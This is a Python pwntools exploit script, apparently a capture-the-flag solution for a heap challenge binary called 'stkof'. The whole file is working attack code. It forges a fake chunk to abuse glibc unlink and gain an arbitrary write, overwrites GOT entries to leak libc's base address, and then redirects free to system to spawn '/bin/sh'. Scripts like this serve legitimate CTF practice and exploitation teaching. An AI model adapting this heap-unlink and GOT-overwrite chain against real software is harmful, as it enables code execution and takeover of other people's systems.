#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-11-29
from pwn import *
context.local(arch='amd64', os='linux')

def create(size):
    io.sendline("1")
    io.sendline(unicode(size))

def input(number, size, payload):
    io.sendline("2")
    io.sendline(unicode(number))
    io.sendline(unicode(size))
    # assert len(payload) == size
    io.send(payload) # send for read , should not use sendline ,sendline is both ok, \n will be left for main

def delete(number):
    io.sendline("3")
    io.sendline(unicode(number))

def pwn(io):
    log.info("[1] create 1 2(malloc 0x20) 3(malloc 0x80) chunks")
    # binary don't have setbuf , heap looks like : gets's chunk, first user malloc chunk, printf's chunk
    create(0x400) # 1 first chunk in data[] number is 1 ;because ++malloc_times
    # gdb.attach(io,'break *0x400C85') # 0x0000000000400C85 atoi in main
    
    create(0x20) # 2  store fake chunk here
    # create smallbins 
    create(0x80) # 3
    # create(0x10) # 4 after unlink, don't merge with top chunks

    log.info("[2] arrange fake 0x21 chunk and fd bk in chunk2 & overflow 3's PREV_SIZE and PREV_INUSE")
    fake_unlink_p = 0x602150
    fd = fake_unlink_p-0x18
    bk = fake_unlink_p-0x10
    payload1_overflow = p64(0) + p64(0x21) + p64(fd) + p64(bk)+ p64(0x20) + p64(0x90) # overflow chunk3 PREV_INUSE , set to 0x90
    input(2,len(payload1_overflow),payload1_overflow)
    delete(3) # unlink chunk2 *(fake_unlink_p) = fd, change the global ptr data[2]@0x602150's content to FD (fake_unlink_p-0x18)!
    log.success("unlink success! we can arbitrary write now!")

    log.info("[3] write puts@plt into free@got and call puts(puts@got)")
    #                                                 1               2                3               4 
    payload2_globalptr = p64(0) + p64(0) + p64(elf.got['free']) + p64(fd) + p64(elf.got['puts']) + p64(0x400DEC) # //TODO
    input(2, len(payload2_globalptr), payload2_globalptr)
    input(1, 8, p64(elf.plt['puts']))
    delete(4) # puts("//TODO")
    delete(3) # puts(puts@got)

    io.recvuntil("//TODO\nOK\n")
    libc.address = u64(io.recv(6)+"\x00\x00") - libc.symbols['_IO_puts']
    log.success("glibc address base @ 0x%x",libc.address )

    log.info("[4] write &system into free@got and call system(\"/bin/sh\")")
    payload3_globalptr = p64(0) + p64(0) + p64(elf.got['free']) + p64(fd) + p64(fake_unlink_p+0x10) + "/bin/sh\x00"
    input(2, len(payload3_globalptr), payload3_globalptr)
    input(1, 8, p64(libc.symbols['system']))
    delete(3) # system("/bin/sh")


if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 1, 0
    # context.log_level = 'debug'
    filename = './stkof'
    elf = ELF(filename)
    if local:
        # socat tcp-l:10002,fork exec:./filename
        io = process(filename)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        context.terminal = ['tmux', 'splitw', '-h' ]
    else:
        io = remote("ip",10001)
    pwn(io)
    io.interactive()
